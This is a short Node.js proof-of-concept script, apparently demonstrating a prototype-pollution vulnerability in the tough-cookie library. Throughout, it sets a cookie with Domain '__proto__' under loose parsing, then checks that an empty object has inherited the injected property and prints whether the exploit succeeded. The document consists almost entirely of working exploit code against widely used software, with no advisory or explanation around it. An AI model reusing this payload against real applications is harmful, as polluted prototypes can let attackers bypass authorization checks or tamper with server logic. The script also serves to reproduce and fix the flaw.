async function main() {
    try {
        console.log("Main enter");
        var tough = require("tough-cookie");
        var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

        console.log("Setting a normal cookie");
        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "Auth=Lol; Domain=google.com; Path=/notauth",
                "https://google.com/",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });

        console.log("Setting an exploit cookie");
        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "Slonser=polluted; Domain=__proto__; Path=/notauth",
                "https://__proto__/admin",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });

        console.log("Trying to access the exploit cookie...");
        var a = {};
        console.log(a["/notauth"]["Slonser"]);
        console.log("EXPLOITED SUCCESSFULLY");
    } catch (error) {
        console.error("Error:", error);
        console.log("EXPLOIT FAILED");
    }
}

main();